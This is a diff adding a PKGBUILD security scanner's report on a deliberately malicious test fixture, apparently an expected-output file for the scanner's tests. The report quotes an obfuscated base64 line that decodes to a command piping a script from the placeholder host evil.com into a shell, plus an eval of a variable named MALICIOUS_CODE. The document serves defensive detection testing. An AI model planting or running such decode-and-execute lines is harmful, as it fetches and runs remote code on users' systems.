@@ -1,0 +1,45 @@
+
+Scan Results: malicious-obfuscated
+============================================================
+
+[CRITICAL] DEEP-001 Decode-and-execute flow
+    The file both decodes/decompresses data and dynamically executes shell input. Together these form a decode->execute payload, even when split across lines.
+    Recommendation: Decode the payload manually and review it. Legitimate builds do not decode and then execute generated shell code.
+    Reference: CWE-506
+
+[HIGH] OBF-001 Base64 decoding
+    Base64 decoding may hide malicious payloads
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
+    Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
+    Recommendation: Decode and review the base64 content manually
+    Reference: CWE-506
+
+[HIGH] OBF-001 Base64 decoding
+    Base64 decoding may hide malicious payloads
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
+    Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
+    Recommendation: Decode and review the base64 content manually
+    Reference: CWE-506
+
+[HIGH] OBF-002 Eval usage
+    Eval can execute obfuscated malicious code
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:17
+    Code:     eval "$MALICIOUS_CODE"
+    Recommendation: Avoid eval; use direct commands instead
+    Reference: CWE-95
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: malicious-obfuscated v1.0.0-1
+Scan duration: 5ms
+
+Found 5 issue(s):
+  1 CRITICAL
+  3 HIGH
+  1 MEDIUM
+============================================================
